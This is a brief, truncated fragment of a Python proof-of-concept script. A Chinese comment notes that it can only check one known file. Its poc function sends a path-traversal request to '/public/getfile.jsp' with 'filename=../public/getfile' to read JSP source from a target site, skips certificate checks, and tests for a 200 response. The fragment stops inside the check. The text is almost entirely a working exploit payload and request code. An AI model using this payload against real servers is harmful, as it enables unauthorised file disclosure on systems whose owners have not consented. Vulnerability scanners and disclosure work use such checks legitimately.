...
'''
	目前只能去检测这个文件，因为不知道这个网站中存在那些文件，看不到
'''
...
def poc(target):
	...
	playload="/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp "

	try:
		parse = requests.get(url=target+playload,headers=headers,verify=False)
		if parse.status_code == 200 and  parse.text:
